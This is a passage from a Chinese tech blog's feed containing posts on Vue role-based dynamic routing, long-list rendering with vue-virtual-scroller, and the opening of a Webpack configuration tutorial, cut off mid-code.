    <content type="html"><![CDATA[<h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><p>后台管理系统，大部分都会涉及到权限控制这一项需求，即：根据不同登录角色渲染不同页面功能</p><p>现在主流有两种方式：</p><ol><li><p>前端控制</p><p>逻辑简单，上手快</p></li><li><p>后端控制</p><p>相对安全，需要后期改动</p></li></ol><a id="more"></a><h2 id="后端控制"><a href="#后端控制" class="headerlink" title="后端控制"></a>后端控制</h2><p>后端路由是大部分后台管理项目的解决方案</p><p>核心：用户登录以后，后端根据该角色生成可访问的路由数据，前端根据这个路由数据转换成自己需要的路由结构</p><p>具体代码结构：</p><ol><li><p>router 文件中，只放一些静态路由和公共路由</p><p>代码参考：<a href="https://github.com/PanJiaChen/vue-element-admin/blob/master/src/router/index.js">https://github.com/PanJiaChen/vue-element-admin/blob/master/src/router/index.js</a></p></li><li><p>在 vuex 中写一个 state，把路由和获取到的角色进行匹配，控制菜单栏的显示隐藏</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; constantRoutes &#125; <span class="keyword">from</span> <span class="string">&#x27;@/router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; getRoutes &#125; <span class="keyword">from</span> <span class="string">&#x27;@/api/menu&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Layout <span class="keyword">from</span> <span class="string">&#x27;@/layout/index&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历后台传来的路由字符串，转换为组件对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterAsyncRoutes</span>(<span class="params">asyncRouterMap</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> asyncRouterMap.filter(<span class="function"><span class="params">route</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (route.component) &#123;</span><br><span class="line">      <span class="comment">// Layout组件特殊处理</span></span><br><span class="line">      <span class="keyword">if</span> (route.component === <span class="string">&#x27;Layout&#x27;</span>) &#123;</span><br><span class="line">        route.component = Layout</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        route.component = loadView(route.component)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (route.children &amp;&amp; route.children.length) &#123;</span><br><span class="line">      route.children = filterAsyncRoutes(route.children)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadView</span>(<span class="params">view</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 注意：webpack4动态import不支持变量方式，如下写法是不行的</span></span><br><span class="line">  <span class="comment">// return () =&gt; import(`@/views/$&#123;view&#125;`)</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">require</span>([<span class="string">`@/views/<span class="subst">$&#123;view&#125;</span>`</span>], resolve)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> permission = &#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    routes: [],</span><br><span class="line">    addRoutes: [],</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    SET_ROUTES: <span class="function">(<span class="params">state, routes</span>) =&gt;</span> &#123;</span><br><span class="line">      state.addRoutes = routes</span><br><span class="line">      state.routes = constantRoutes.concat(routes)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  actions: &#123;</span><br><span class="line">    <span class="function"><span class="title">GenerateRoutes</span>(<span class="params">&#123; commit &#125;</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> Id = sessionStorage.getItem(<span class="string">&#x27;SESSION_KEY&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        getRoutes(Id).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> accessedRoutes = filterAsyncRoutes(res.data)</span><br><span class="line">          accessedRoutes.push(&#123; <span class="attr">path</span>: <span class="string">&#x27;*&#x27;</span>, <span class="attr">redirect</span>: <span class="string">&#x27;/404&#x27;</span>, <span class="attr">hidden</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">          commit(<span class="string">&#x27;SET_ROUTES&#x27;</span>, accessedRoutes)</span><br><span class="line">          resolve(accessedRoutes)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>给后端整理一份前端需要的 router 数据结构</p><p>一般必须有的参数：id、path、name、title、children</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">path: <span class="comment"># 路由地址</span></span><br><span class="line">name: <span class="comment"># 路由名称</span></span><br><span class="line">id: <span class="comment"># id</span></span><br><span class="line">component: <span class="comment"># 组件路径</span></span><br><span class="line">meta-&gt;title: <span class="comment"># 菜单名称(和path同级就可以)</span></span><br><span class="line">meta-&gt;icon: <span class="comment"># 菜单图标(和path同级就可以)</span></span><br><span class="line">meta-&gt;<span class="built_in">type</span>: <span class="comment"># 菜单类型，用于区分模块、目录、菜单、按钮</span></span><br><span class="line">meta-&gt;hidden: <span class="comment"># 是否全局隐藏此菜单</span></span><br><span class="line">children: <span class="comment"># 子集集合</span></span><br></pre></td></tr></table></figure><p>如果后端传的不是 children，是 parentId 那种类型，则需要写一个转换方法</p><p>方法可以参考这篇文章：<a href="https://blog.csdn.net/qq_38689395/article/details/116019842?spm=1001.2014.3001.5501">Vue 封装无限层级树形菜单组件（后台传的是扁平数组）</a></p></li><li><p>在导航守卫中，使用 <code>router.beforeEach</code> 进行拦截，可以动态添加可访问的路由表（使用 addRoutes 添加）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> NProgress <span class="keyword">from</span> <span class="string">&#x27;nprogress&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;nprogress/nprogress.css&#x27;</span></span><br><span class="line"></span><br><span class="line">NProgress.configure(&#123; <span class="attr">showSpinner</span>: <span class="literal">false</span> &#125;)</span><br><span class="line"><span class="keyword">const</span> whiteList = [<span class="string">&#x27;/login&#x27;</span>, <span class="string">&#x27;/auth-redirect&#x27;</span>, <span class="string">&#x27;/bind&#x27;</span>, <span class="string">&#x27;/register&#x27;</span>]</span><br><span class="line"></span><br><span class="line">router.beforeEach(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">  NProgress.start()</span><br><span class="line">  <span class="comment">// 判断是否有token</span></span><br><span class="line">  <span class="keyword">if</span> (store.getters.token) &#123;</span><br><span class="line">    <span class="keyword">if</span> (to.path === <span class="string">&#x27;/login&#x27;</span>) &#123;</span><br><span class="line">      next(&#123; <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span> &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 判断当前用户是否已拉取完user_info信息</span></span><br><span class="line">      <span class="keyword">if</span> (store.getters.roles.length === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取info信息</span></span><br><span class="line">        store.dispatch(<span class="string">&#x27;GetInfo&#x27;</span>).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> roles = res.roles</span><br><span class="line">          store</span><br><span class="line">            .dispatch(<span class="string">&#x27;GenerateRoutes&#x27;</span>, &#123; roles &#125;)</span><br><span class="line">            .then(<span class="function"><span class="params">accessRoutes</span> =&gt;</span> &#123;</span><br><span class="line">              <span class="comment">// 动态添加可访问路由表</span></span><br><span class="line">              router.addRoutes(accessRoutes)</span><br><span class="line">              <span class="comment">// hack方法 确保addRoutes已完成</span></span><br><span class="line">              next(&#123; ...to, <span class="attr">replace</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">            .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">              <span class="built_in">console</span>.log(err)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 当有用户权限的时候，说明可访问路由表已生成</span></span><br><span class="line">        next()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (whiteList.includes(to.path)) &#123;</span><br><span class="line">      <span class="comment">// 在免登录白名单，直接进入</span></span><br><span class="line">      next()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 否则全部重定向到登录页</span></span><br><span class="line">      next(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>从 router 中取出可用的路由对象，来进行侧边栏的渲染</p></li></ol><p>也可以参考这篇文章：<a href="https://blog.csdn.net/weixin_46923775/article/details/108366807?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-18.control&dist_request_id=1619664910213_44556&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-18.control">后端控制路由</a></p><h2 id="前端控制"><a href="#前端控制" class="headerlink" title="前端控制"></a>前端控制</h2><p>可以参考花裤衩的文章，<a href="https://segmentfault.com/a/1190000009506097">手摸手，带你用vue撸后台 系列二(登录权限篇)</a></p><p>核心：通过 token 获取用户的 role，根据 role 动态跟路由表 <code>meta.role</code> 进行匹配，形成可访问的路由再通过 <code>router.addRotes</code> 动态挂载路由</p><p>具体代码结构：</p><ul><li>可以参考：<a href="https://juejin.cn/post/6844904145267195917">动态路由前端控制还是后端控制？（附代码）</a></li></ul><ol><li><p>把动态路由和静态路由分别写在 router 文件中（<code>asyncRoutes/constantRoutes</code>）。在动态路由的 meta 元信息中添加 roles 权限</p><p>代码参考：<a href="https://github.com/PanJiaChen/vue-element-admin/blob/master/src/router/index.js">https://github.com/PanJiaChen/vue-element-admin/blob/master/src/router/index.js</a></p></li><li><p>在 vuex 中写一个 state，把路由和获取到的角色进行匹配，控制菜单栏的显示隐藏</p><p>代码参考：<a href="https://github.com/PanJiaChen/vue-element-admin/blob/master/src/store/modules/permission.js">https://github.com/PanJiaChen/vue-element-admin/blob/master/src/store/modules/permission.js</a></p></li><li><p>在导航守卫中，使用 <code>router.beforeEach</code> 进行拦截，可以动态添加可访问的路由表（使用 addRoutes 添加）</p><p><a href="https://github.com/PanJiaChen/vue-element-admin/blob/master/src/permission.js">https://github.com/PanJiaChen/vue-element-admin/blob/master/src/permission.js</a></p></li><li><p>从 router 中取出可用的路由对象，来进行侧边栏的渲染</p><p><a href="https://github.com/PanJiaChen/vue-element-admin/blob/master/src/layout/components/Sidebar/index.vue">https://github.com/PanJiaChen/vue-element-admin/blob/master/src/layout/components/Sidebar/index.vue</a></p><p><a href="https://github.com/PanJiaChen/vue-element-admin/blob/master/src/layout/components/Sidebar/SidebarItem.vue">https://github.com/PanJiaChen/vue-element-admin/blob/master/src/layout/components/Sidebar/SidebarItem.vue</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;动态路由&quot;&gt;&lt;a href=&quot;#动态路由&quot; class=&quot;headerlink&quot; title=&quot;动态路由&quot;&gt;&lt;/a&gt;动态路由&lt;/h2&gt;&lt;p&gt;后台管理系统，大部分都会涉及到权限控制这一项需求，即：根据不同登录角色渲染不同页面功能&lt;/p&gt;
&lt;p&gt;现在主流有两种方式：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;前端控制&lt;/p&gt;
&lt;p&gt;逻辑简单，上手快&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;后端控制&lt;/p&gt;
&lt;p&gt;相对安全，需要后期改动&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="前端路由" scheme="http://llmysnow.top/tags/%E5%89%8D%E7%AB%AF%E8%B7%AF%E7%94%B1/"/>
    
    <category term="后端路由" scheme="http://llmysnow.top/tags/%E5%90%8E%E7%AB%AF%E8%B7%AF%E7%94%B1/"/>
    
  </entry>
  
  <entry>
    <title>Vue 大量数据展示卡顿解决方案（长列表优化）</title>
    <link href="http://llmysnow.top/posts/b05a9b29/"/>
    <id>http://llmysnow.top/posts/b05a9b29/</id>
    <published>2021-08-31T02:16:08.892Z</published>
    <updated>2021-08-31T02:16:08.892Z</updated>
    
    <content type="html"><![CDATA[<h2 id="需求分析（长列表展示）"><a href="#需求分析（长列表展示）" class="headerlink" title="需求分析（长列表展示）"></a>需求分析（长列表展示）</h2><p>页面某处需要渲染 <strong>1w+</strong> 条数据，并需要<strong>滚动展示</strong>，这时如果直接把这些数据渲染到页面上，会导致系统内存大量被占用，导致页面卡顿或崩溃</p><p>我们都知道，每次 DOM 修改，浏览器都会重新计算元素布局，再重新渲染（回流 / 重绘）。如果数据量很大，页面计算时间就会加成，造成页面卡顿</p><a id="more"></a><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ul><li>根源：DOM 元素太多</li><li>思路：限制元素数量 / 虚拟DOM</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/bigData.gif"></p><p>后台数据格式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        checked: <span class="number">0</span>，</span><br><span class="line">        data: <span class="string">&quot;xxx&quot;</span>，</span><br><span class="line">        label: <span class="string">&quot;xxx&quot;</span>，</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>Vue 中就有一个现成的轮子可以解决这个问题：<a href="https://github.com/Akryum/vue-virtual-scroller#recyclescroller">vue-virtual-scroller</a></p><ol><li>安装 <code>vue-virtual-scroller</code> 插件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save vue-virtual-scroller</span><br></pre></td></tr></table></figure><ol start="2"><li>在 <code>main.js</code> 引入</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意：别忘了引用这个css</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;vue-virtual-scroller/dist/vue-virtual-scroller.css&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; RecycleScroller &#125; <span class="keyword">from</span> <span class="string">&#x27;vue-virtual-scroller&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.component(<span class="string">&#x27;RecycleScroller&#x27;</span>, RecycleScroller)</span><br></pre></td></tr></table></figure><ol start="3"><li>在组件里使用<ul><li><code>items</code>：呈现数据</li><li><code>item-size</code>：呈现数据的大小 / 高度</li><li><code>key-filed</code>：如果 <code>items</code> 是对象，需要用这个做唯一标识</li></ul></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;RecycleScroller</span><br><span class="line">  style=&quot;height: 200px; overflow: auto&quot;</span><br><span class="line">  class=&quot;scroller&quot;</span><br><span class="line">  :items=&quot;listItem&quot;</span><br><span class="line">  :item-size=&quot;20&quot;</span><br><span class="line">  key-field=&quot;data&quot;</span><br><span class="line">&gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot</span>=<span class="string">&quot;&#123; item &#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-checkbox</span> <span class="attr">:key</span>=<span class="string">&quot;item.data&quot;</span> <span class="attr">:label</span>=<span class="string">&quot;item.label&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">RecycleScroller</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line">            listItem: []</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>使用  <code>vue-virtual-scroller</code> 插件展示大量数据，是可以比较流畅的渲染 / 滚动的</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;需求分析（长列表展示）&quot;&gt;&lt;a href=&quot;#需求分析（长列表展示）&quot; class=&quot;headerlink&quot; title=&quot;需求分析（长列表展示）&quot;&gt;&lt;/a&gt;需求分析（长列表展示）&lt;/h2&gt;&lt;p&gt;页面某处需要渲染 &lt;strong&gt;1w+&lt;/strong&gt; 条数据，并需要&lt;strong&gt;滚动展示&lt;/strong&gt;，这时如果直接把这些数据渲染到页面上，会导致系统内存大量被占用，导致页面卡顿或崩溃&lt;/p&gt;
&lt;p&gt;我们都知道，每次 DOM 修改，浏览器都会重新计算元素布局，再重新渲染（回流 / 重绘）。如果数据量很大，页面计算时间就会加成，造成页面卡顿&lt;/p&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="长列表优化" scheme="http://llmysnow.top/tags/%E9%95%BF%E5%88%97%E8%A1%A8%E4%BC%98%E5%8C%96/"/>
    
    <category term="大数据" scheme="http://llmysnow.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    <category term="滚动展示" scheme="http://llmysnow.top/tags/%E6%BB%9A%E5%8A%A8%E5%B1%95%E7%A4%BA/"/>
    
  </entry>
  
  <entry>
    <title>Webpack（优化和问题）</title>
    <link href="http://llmysnow.top/posts/4317de95/"/>
    <id>http://llmysnow.top/posts/4317de95/</id>
    <published>2021-08-31T02:16:08.892Z</published>
    <updated>2021-08-31T02:16:08.892Z</updated>
    
    <content type="html"><![CDATA[<p>观看视频：<a href="https://www.bilibili.com/video/BV1e7411j7T5?p=24&spm_id_from=pageDriver">尚硅谷最新版Webpack5实战教程(从入门到精通)</a></p><a id="more"></a><h2 id="Webpack-简介"><a href="#Webpack-简介" class="headerlink" title="Webpack 简介"></a>Webpack 简介</h2><h3 id="webpack-是什么"><a href="#webpack-是什么" class="headerlink" title="webpack 是什么"></a>webpack 是什么</h3><p>webpack 是一种 <strong>前端资源构建工具</strong> ，一个静态模块打包器（module bundler）</p><p>在 webpack 看来，前端的所有资源文件（js/json/css/img/less…）都会作为模块处理。它将根据模块的依赖关系进行静态分析，打包生成对应的静态资源（bundle）。</p><h3 id="webpack-五个核心概念"><a href="#webpack-五个核心概念" class="headerlink" title="webpack 五个核心概念"></a>webpack 五个核心概念</h3><ol><li><p>Entry</p><p>入口，指示 webpack 以哪个文件作为入口起点开始打包，分析构建内部依赖图</p></li><li><p>Output</p><p>输出，指示 webpack 打包后的资源 bundles 输出到哪里去，以及如何命名</p></li><li><p>Loader</p><p>让 webpack 能够去处理那些非 JavaScript 文件（webpack 自身只理解 JavaScript）</p></li><li><p>Plugins</p><p>可以用于执行范围更广的任务。插件的范围包括，从打包优化和压缩，一直到重新定义环境中的变量等</p></li><li><p>Mode</p><table><thead><tr><th>选项</th><th>描述</th><th>特点</th></tr></thead><tbody><tr><td>development</td><td>会将 DefinePlugin 中的 process.env.NODE_ENV 的值设为 development</td><td>能让代码本地调试运行的环境</td></tr><tr><td>production</td><td>会将 DefinePlugin 中的 process.env.NODE_ENV 的值设为 production</td><td>能将代码优化上线运行的环境</td></tr></tbody></table></li></ol><h2 id="Webpack-初体验"><a href="#Webpack-初体验" class="headerlink" title="Webpack 初体验"></a>Webpack 初体验</h2><h3 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h3><ol><li><p>初始化 package.json：npm init</p></li><li><p>下载安装 webpack：（webpack4 以上的版本需要全局/本地都安装 webpack-cli）</p><p>全局安装：<code>npm i webpack@4 webpack-cli@3 -g</code></p><p>本地安装：<code>npm i webpack@4 webpack-cli@3 -D</code></p></li></ol><h3 id="编译打包应用"><a href="#编译打包应用" class="headerlink" title="编译打包应用"></a>编译打包应用</h3><p>运行指令：</p><ul><li>开发环境：<code>webpack ./src/index.js -o ./build/built.js --mode=development</code>，webpack 会以 <code>./src/index.js</code> 为入口文件开始打包，打包后输出到 <code>./build/built.js</code> 整体打包环境，是开发环境</li><li>生产环境：<code>webpack ./src/index.js -o ./build/built.js --mode=production</code>，webpack 会以 <code>./src/index.js</code> 为入口文件开始打包，打包后输出到 <code>./build/built.js</code> 整体打包环境，是生产环境</li></ul><p>结论：</p><ol><li>webpack 能处理 js、json，不能处理 css、img等其他资源</li><li>生产环境和开发环境将 ES6 模块化编译成浏览器能识别的模块化</li><li>生产环境比开发环境多一个压缩 JS 代码</li></ol><h2 id="Webpack-环境的基本配置"><a href="#Webpack-环境的基本配置" class="headerlink" title="Webpack 环境的基本配置"></a>Webpack 环境的基本配置</h2><p><code>webpack.config.js</code> 是 webpack 的配置文件</p><ul><li>作用：指示 webpack 干哪些活（当你运行 webpack 指令时，会加载里面的配置）</li><li>所有构建工具都是基于 nodejs 平台运行的，模块化采用 commonjs</li></ul><p>path 模块的 resolve <code>__dirname</code> nodejs 的变量，代表当前文件的目录的绝对路径</p><p>loader，rules 下的 use 数组中 loader 执行顺序：从右到左、从下到上依次执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm i less-loader@6 style-loader css-loader@ -D</span><br><span class="line">npm i html-webpack-plugin@4 -D</span><br><span class="line">npm i url-loader file-loader -D</span><br><span class="line">npm i html-loader@0.5 -D</span><br><span class="line">npm i webpack-dev-server -D</span><br></pre></td></tr></table></figure><p><code>url-loader</code> 只能处理样式中的图片资源，这个 loader 对图片资源进行 ES6Module 引入 ，为了跟 <code>html-loader</code> 一致，需关闭 ES6Module（<code>esModule :false</code>）</p><ul><li><p>可以做图片 base64 处理</p><p>优点：减少请求数量（减轻服务器压力）</p><p>缺点：图片体积会更大（文件请求速度更慢）</p></li></ul><p><code>html-loader</code> 处理html中的图片资源，这个 loader 对图片资源进行 commonJS 引入 </p><p>devServer：<code>npx webpack-dev-server</code></p><p>开发服务器devServer：用来自动化（自动编译，自动打开浏览器，自动刷新浏览器）。特点：只会在内存中编译打包，不会有任何输出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">// 入口起点</span></span><br><span class="line">  entry: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">  <span class="comment">// 输出</span></span><br><span class="line">  output: &#123;</span><br><span class="line">    <span class="comment">// 输出文件名</span></span><br><span class="line">    filename: <span class="string">&#x27;built.js&#x27;</span>,</span><br><span class="line">    <span class="comment">// 输出路径</span></span><br><span class="line">    path: resolve(__dirname, <span class="string">&#x27;build&#x27;</span>),</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// loader配置</span></span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      <span class="comment">// 